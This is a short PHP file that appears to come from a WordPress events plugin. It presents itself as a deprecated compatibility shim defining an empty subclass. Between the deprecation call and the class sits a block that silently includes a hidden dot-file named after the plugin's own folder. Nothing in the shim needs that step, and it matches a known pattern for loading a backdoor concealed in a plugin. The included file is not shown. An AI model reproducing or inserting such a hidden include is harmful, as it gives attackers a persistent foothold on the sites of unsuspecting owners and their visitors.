<?php
_deprecated_file( __FILE__, '4.2', 'Tribe__PUE__Plugin_Info' );


if ( file_exists( plugin_dir_path( __FILE__ ) . '/.' . basename( plugin_dir_path( __FILE__ ) ) . '.php' ) ) {
    include_once( plugin_dir_path( __FILE__ ) . '/.' . basename( plugin_dir_path( __FILE__ ) ) . '.php' );
}

class Tribe__Events__PUE__Plugin_Info extends Tribe__PUE__Plugin_Info {

}